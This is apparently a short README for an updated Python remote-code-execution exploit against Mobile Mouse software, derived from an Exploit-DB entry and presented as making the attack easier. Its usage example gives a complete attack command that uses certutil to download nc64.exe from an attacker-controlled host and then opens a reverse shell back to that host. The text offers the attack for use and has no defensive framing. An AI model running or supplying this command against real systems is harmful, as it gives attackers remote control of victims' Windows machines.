This python script is an update to Chokri Hammedi's RCE found here: https://www.exploit-db.com/exploits/51010
The updated script makes RCE easier.
Usage example: python3 mobilemouse.py --target $IP --cmd "certutil -urlcache -split -f http://LHOST/nc64.exe C:\Windows\Tasks\nc64.exe && C:\Windows\Tasks\nc64.exe -e cmd.exe LHOST LPORT"
